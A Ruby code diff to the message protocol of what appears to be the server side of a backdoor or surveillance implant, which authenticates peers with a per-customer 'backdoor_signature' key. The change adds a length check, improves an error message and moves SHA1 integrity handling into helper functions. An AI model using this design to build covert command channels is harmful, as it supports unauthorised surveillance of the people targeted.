@@ -30,11 +30,14 @@ class Protocol
   def self.authenticate(peer, uri, content)
     trace :info, "[#{peer}] Authentication required..."
 
+    # integrity check (104 byte of data, 112 padded)
+    return unless content.length == 112
+
     # decrypt the message with the per customer signature
     begin
       message = aes_decrypt(content, DB.instance.backdoor_signature)
-    rescue
-      trace :error, "[#{peer}] Invalid message decryption"
+    rescue Exception => e
+      trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
       return
     end
 
@@ -160,10 +163,7 @@ class Protocol
 
     begin
       # decrypt the message
-      message = aes_decrypt(content, session[:key])
-      # check the integrity at the end of the message
-      check = message.slice!(message.length - Digest::SHA1.new.digest_length, message.length)
-      raise "Invalid sha1 check" unless check == Digest::SHA1.digest(message)
+      message = aes_decrypt_integrity(content, session[:key])
     rescue Exception => e
       trace :error, "[#{peer}][#{cookie}] Invalid message decryption: #{e.message}"
       return
@@ -184,10 +184,8 @@ class Protocol
     end
     
     begin
-      # add the integrity at the end of the response
-      response += Digest::SHA1.digest(response)
       # crypt the message with the session key
-      response = aes_encrypt(response, session[:key])
+      response = aes_encrypt_integrity(response, session[:key])
     rescue
       trace :error, "[#{peer}][#{cookie}] Invalid message encryption"
       return
